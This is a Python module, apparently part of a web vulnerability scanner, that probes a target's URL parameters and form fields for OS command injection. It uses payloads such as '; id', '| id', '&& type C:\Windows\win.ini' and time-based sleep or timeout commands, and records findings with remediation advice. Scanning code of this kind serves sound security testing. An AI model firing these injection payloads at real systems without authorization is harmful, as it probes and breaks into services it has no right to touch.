import time
import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import Dict, Any, Optional, List

from utils.logger import logger

def execute(target: str, forms: Optional[List[Dict[str, Any]]] = None, session: Optional[requests.Session] = None) -> Dict[str, Any]:
    """
    Execute OS Command Injection checks against the target URL and forms.

    Args:
        target (str): The target URL to scan.
        forms (list): Optional list of forms on the target.
        session (requests.Session): The optional authenticated session context.

    Returns:
        Dict[str, Any]: A dictionary containing the scan results.
    """
    logger.info(f"Starting Command Injection scan on target: {target}")
    forms = forms or []
    req_client = session if session else requests

    payloads = [

        {"cmd": "; id", "check": "uid=", "type": "Basic OS Command (Linux)"},
        {"cmd": "| id", "check": "uid=", "type": "Pipe command (Linux)"},

        {"cmd": "& ipconfig /all", "check": "Windows IP Configuration", "type": "Basic OS Command (Windows)"},
        {"cmd": "&& type C:\\Windows\\win.ini", "check": "[extensions]", "type": "Chained OS Command (Windows)"},

        {"cmd": "; sleep 5", "check": "TIME_BASED", "delay": 5, "type": "Blind Command Injection (Linux)"},
        {"cmd": "& timeout /t 5", "check": "TIME_BASED", "delay": 5, "type": "Blind Command Injection (Windows)"}
    ]

    results: Dict[str, Any] = {
        "vulnerabilities_found": False,
        "details": []
    }

    def check_response(resp: requests.Response, payload_config: dict, param_name: str, test_url: str, elapsed_time: float, injection_context: str):
        vuln_detected = False
        evidence = ""


        if payload_config["check"] != "TIME_BASED":
            resp_lower = resp.text.lower()
            if payload_config["check"].lower() in resp_lower or "www-data" in resp_lower or "daemon" in resp_lower:
                vuln_detected = True
                evidence = f"Output matched OS signature (e.g., {payload_config['check']}, www-data, daemon)"

        else:
            expected_delay = payload_config.get("delay", 5)

            if elapsed_time >= (expected_delay - 0.5):
                vuln_detected = True
                evidence = f"Response delayed by {elapsed_time:.2f} seconds, indicating successful sleep/timeout."

        if vuln_detected:
            logger.warning(f"[!] Command Injection Vulnerability Found! Payload: {payload_config['cmd']} in {injection_context}")
            results["vulnerabilities_found"] = True
            results["details"].append({
                "type": "OS Command Injection",
                "severity": "Critical",
                "parameter": param_name,
                "payload": payload_config['cmd'],
                "url": test_url,
                "evidence": evidence,
                "remediation": "Do not pass user-supplied data directly to OS command execution functions like system(), exec(), or os.popen(). Use well-tested libraries or language-specific APIs instead."
            })


    baseline_time = 0.0
    try:
        start_time = time.time()
        resp = req_client.get(target, timeout=10)
        baseline_time = time.time() - start_time
    except requests.RequestException as e:
        logger.error(f"Cannot baseline target {target} for Command Injection: {e}")
        return results


    parsed_url = urlparse(target)
    query_params = parse_qsl(parsed_url.query, keep_blank_values=True)

    if query_params:
        for payload_config in payloads:
            for i, (param_name, param_value) in enumerate(query_params):
                test_params = query_params.copy()
                test_params[i] = (param_name, param_value + payload_config["cmd"])

                new_query = urlencode(test_params)
                test_url = urlunparse(parsed_url._replace(query=new_query))

                try:
                    start_val = time.time()
                    resp = req_client.get(test_url, timeout=15)
                    elapsed = time.time() - start_val

                    check_response(resp, payload_config, param_name, test_url, elapsed, "URL Query Parameter")
                except requests.RequestException:

                    if payload_config["check"] == "TIME_BASED":
                        elapsed = time.time() - start_val
                        if elapsed >= payload_config.get("delay", 5) - 0.5:
                            logger.warning(f"[!] Command Injection (Blind) Vulnerability Found via Timeout! Payload: {payload_config['cmd']}")
                            results["vulnerabilities_found"] = True
                            results["details"].append({
                                "type": "OS Command Injection (Blind/Timeout)",
                                "severity": "Critical",
                                "parameter": param_name,
                                "payload": payload_config['cmd'],
                                "url": test_url,
                                "evidence": f"Request timed out after {elapsed:.2f} seconds matching sleep payload.",
                                "remediation": "Avoid passing user input to OS shell commands."
                            })


    for form in forms:
        action = form.get("action", target)
        method = form.get("method", "get").upper()
        inputs = form.get("inputs", [])

        for payload_config in payloads:
            for target_input in inputs:
                input_name = target_input.get("name")
                if not input_name:
                    continue

                data_payload = {}
                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue
                    if name == input_name:
                        data_payload[name] = payload_config["cmd"]
                    else:
                        data_payload[name] = "test"

                try:
                    start_val = time.time()
                    if method == "POST":
                        resp = req_client.post(action, data=data_payload, timeout=15)
                    else:
                        resp = req_client.get(action, params=data_payload, timeout=15)
                    elapsed = time.time() - start_val

                    check_response(resp, payload_config, input_name, action, elapsed, f"Form Input ({method})")
                except requests.RequestException:
                    if payload_config["check"] == "TIME_BASED":
                        elapsed = time.time() - start_val
                        if elapsed >= payload_config.get("delay", 5) - 0.5:
                            logger.warning(f"[!] Command Injection (Blind Form POST/GET) Vulnerability Found via Timeout! Payload: {payload_config['cmd']}")
                            results["vulnerabilities_found"] = True
                            results["details"].append({
                                "type": "OS Command Injection (Blind/Timeout)",
                                "severity": "Critical",
                                "parameter": input_name,
                                "payload": payload_config['cmd'],
                                "url": action,
                                "evidence": f"Form submission timed out after {elapsed:.2f}s matching sleep.",
                                "remediation": "Avoid passing user input to OS shell commands."
                            })

    return results
